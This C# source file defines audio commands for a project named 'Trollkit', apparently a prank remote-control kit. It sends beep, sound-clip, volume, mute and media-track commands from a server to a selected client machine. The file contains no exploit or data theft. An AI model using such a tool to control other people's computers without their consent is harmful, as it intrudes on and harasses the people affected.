using System;
using System.Windows.Input;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;

namespace Trollkit_Library.ViewModels.Commands
{
	public class AudioCommands
	{
		private Server _server;
		private string handler;
		public AudioCommands(Server server, string handler)
		{
			_server = server;
			this.handler = handler;
		}

		public ICommand Beep { get { return new SendServerCommand(SendBeep); } }
		public ICommand MyNameIsJeff { get { return new SendServerCommand(SendMyNameIsJeff); } }
		public ICommand VolumeUp { get { return new SendServerCommand(SendVolumeUp); } }
		public ICommand VolumeDown { get { return new SendServerCommand(SendVolumeDown); } }
		public ICommand WesselMove { get { return new SendServerCommand(SendWesselMove); } }
		public ICommand Windows { get { return new SendServerCommand(SendWindows); } }
		public ICommand Horn { get { return new SendServerCommand(SendHorn); } }
		public ICommand Macintosh { get { return new SendServerCommand(SendMacintosh); } }
		public ICommand PlayPause { get { return new SendServerCommand(SendPlayPauze); } }
		public ICommand Next { get { return new SendServerCommand(SendNext); } }
		public ICommand Previous { get { return new SendServerCommand(SendPrev); } }
		public ICommand Mute { get { return new SendServerCommand(SendMute); } }
		public ICommand StopSound { get { return new SendServerCommand(SendStop); } }

		public void SendBeep()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "PlayBeep", Handler = handler, Value = "800,800" };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendMyNameIsJeff()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "Jeff", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendVolumeUp()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "VolumeUp", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendVolumeDown()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "VolumeDown", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendWesselMove()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "WesselMove", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendWindows()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "Windows", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendHorn()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "Horn", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendMacintosh()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "Macintosh", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}


		private void SendPlayPauze()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "PlayPause", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendNext()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "NextTrack", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendMute()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "Mute", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendPrev()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "PreviousTrack", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendStop()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "Stop", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}
	}
}
